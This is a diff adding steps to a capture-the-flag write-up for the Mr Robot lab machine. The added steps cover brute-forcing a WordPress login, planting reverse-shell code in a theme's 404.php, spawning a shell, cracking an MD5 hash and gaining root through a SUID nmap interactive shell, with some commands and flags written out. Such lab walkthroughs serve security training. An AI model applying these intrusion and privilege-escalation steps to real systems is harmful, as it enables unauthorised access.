@@ -44,6 +44,7 @@ The options are prepare ,fsociety,inform,question,wakeup and join.
 
 ## Flags
 
+#### Flag 1
 Searching the /robots.txt directory I am presented with
 ```
 User-agent: *
@@ -54,7 +55,7 @@ key-1-of-3.txt
 So I navigate to key-1-of-3.txt and get my first flag
 `073403c8a58a1f80d943455fb30724b9`
 
-
+#### Flag 2
 Next I download the dictionary fsocity.dic 
 And scan the machine with [[Gobuster]] 
 `gobuster dir -w fsocity.dic -u [ip]`
@@ -72,3 +73,54 @@ I open burp, capture the login request with proxy and send it to the intruder.
 I use a sniper attack and as payload I use the fsocity.dic.
 After sometime I find the password
 So I have the creds `Elliot    ER28-0652`
+
+I take a look around and find the Appearance. Under that tab there is an Editor tab, that contains code. I will paste reverse-shell code.
+On the 404.php file I paste my code. I open a netcat connection and navigate on the /404.php subdirectory and catch the connection!
+I navigate on `/home/robot` and find key-2-of-3.txt and password.raw-md5
+I dont have permission to cat the second key.
+So I cat the password.raw-md5 `robot:c3fcd3d76192e4007dfb496cca67e13b`
+The result of md5 is `abcdefghijklmnopqrstuvwxyz`
+
+I try to su on robot, but I get `su: must be run from a terminal`
+So to spawn a stable terminal I type `python -c 'import pty;pty.spawn("/bin/bash")'`
+And now I can su on robot with the above password.
+And I get the second key `822c73956184f694993bede3eb39f959`
+
+## Priv Esc
+
+#### Flag 3
+I try `sudo -l` but I get: Sorry, user robot may not run sudo on linux.
+
+Next I found this online `find / -perm -u=s -type f 2>/dev/null`
+```
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+```
+
+Also the hind on the last flag was `nmap`
+I see `/usr/local/bin/nmap`, so I search on GTFO bins
+I find [this](https://gtfobins.github.io/gtfobins/nmap/), I tried the first method on the Sudo section, but I got
+`robot is not in the sudoers file.  This incident will be reported.`
+I tried without sudo, but nothing
+
+So I tried the second method
+```
+sudo nmap --interactive
+nmap> !sh
+```
+Again without sudo and I got root!
+Under /root I found my last flag `04787ddef27c3dee1ee161b21670b4e4`
